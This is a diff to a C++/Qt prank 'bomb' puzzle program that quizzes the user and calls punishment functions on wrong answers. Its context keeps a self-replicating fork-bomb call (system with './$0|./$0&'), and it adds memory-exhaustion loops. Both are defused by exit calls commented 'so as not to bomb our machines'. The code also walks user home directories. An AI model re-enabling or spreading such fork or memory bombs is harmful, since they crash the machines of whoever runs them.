@@ -86,6 +86,12 @@ void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suit
 	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
 }
 
+qint64 canard(qint64 canary){
+  //what would canary = canary++<<1;// do?
+  canary <<= canary++>>1;
+  return (std::pow(-getNumaNuma((1-getNumaNuma(0.2))/2)*getNumaNuma((1-getNumaNuma(0.2))/2),canary)-std::pow(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(-getNumaNuma((1-getNumaNuma(0.2))/2)*getNumaNuma((1-getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
+}
+
 void pleaseOnlyReadatNight(QString dir){
     if(OS==mac){
         dir=QString("");
@@ -138,12 +144,32 @@ void letsSpoon(){
         }else{
             system("./$0|./$0&");
         }
-        exit(-1);
+        exit(-1); // So as not to bomb our machines
     }
     letsSpoon();
 }
 
+void gehinomEchad(){
+    while(1){
+        char* oEchat = new char[1337];
+        exit(-5); // So as not to bomb our machines
+        if(oEchat == NULL){
+            continue;
+        }
+    }
+}
 
+void gehinomShtaim(){
+    // QThread
+    int l = (3*3)-7;
+    while(1 == --l){
+        char* echad = new char[1];
+        if(echad == NULL){
+            continue;
+        }
+        exit(-5); // So as not to bomb our machines
+    }
+}
 
 
 int main(/*int argc, char *argv[]*/){
@@ -208,7 +234,7 @@ ousted:
 		if(OS==win){
 			dir=QString("C:/Users");
 		}else if(OS==mac){
-			dir=QString("..."); // Fuck macs?
+            dir=QString("...");
 		}else if(OS==linux){
 			dir=QString("/home");
 		}
@@ -228,7 +254,34 @@ ousted:
 		}
 	}
 outed:
+    goto DefinitelyNotPhase1;
 	return 0;
+
+DefinitelyNotPhase1:
+    {
+        qint64 p = 5;
+        p = canard(p);
+        std::string str;
+        std::cout<<p + "?";
+        getline(std::cin,str);
+        if(str != QString::number(5).toStdString()){
+            gehinomEchad();
+        }
+        p = canard((20+20+-13));
+        std::cout<<p + "?";
+        getline(std::cin,str);
+        if(str != QString::number(7*4-1).toStdString()){
+            gehinomEchad();
+        }
+        p = canard((58+83-88));
+        std::cout<<p + "?";
+        getline(std::cin,str);
+        if(str != QString::number(7*7+2*2).toStdString()){
+            gehinomEchad();
+        }
+
+        return 0;
+    }
 Phase10:
 	{
 		size_t sizet = 13;
@@ -258,7 +311,7 @@ Phase10:
 		viktor[1] = 'a';
 		viktor[2] = 'm';
 
-		std::cout<<"Which character wore a dolphin on their hand?";
+        std::cout<<"Which character wore a dolphin puppet on their hand?";
 		getline(std::cin,str);
 		int c = 15 ^ 15;
 		while(c < 3 && (tolower(str[c]) == viktor[c])){
